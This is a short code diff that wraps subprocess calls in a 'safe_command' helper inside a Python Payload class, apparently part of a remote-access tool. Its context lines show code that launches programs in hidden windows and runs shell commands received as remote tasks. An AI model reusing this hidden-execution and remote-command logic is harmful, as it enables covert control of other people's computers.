@@ -20,6 +20,8 @@ import threading
 import subprocess
 import collections
 import logging.handlers
+from security import safe_command
+
 if sys.version_info[0] < 3:
     from urllib import urlretrieve
     from urllib2 import urlopen, urlparse
@@ -678,11 +680,11 @@ class Payload():
                 info = subprocess.STARTUPINFO()
                 info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                 info.wShowWindow = subprocess.SW_HIDE
-                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
+                self.execute.process_list[name] = safe_command.run(subprocess.Popen, args, startupinfo=info)
                 return "Running '{}' in a hidden process".format(path)
             except Exception as e:
                 try:
-                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    self.execute.process_list[name] = safe_command.run(subprocess.Popen, args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
                     log("{} error: {}".format(self.execute.__name__, str(e)))
@@ -1016,7 +1018,7 @@ class Payload():
                             if command:
                                 result = command(action) if action else command()
                             else:
-                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
+                                result, reserr = safe_command.run(subprocess.Popen, task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
                                 if result == None:
                                     result = reserr
 
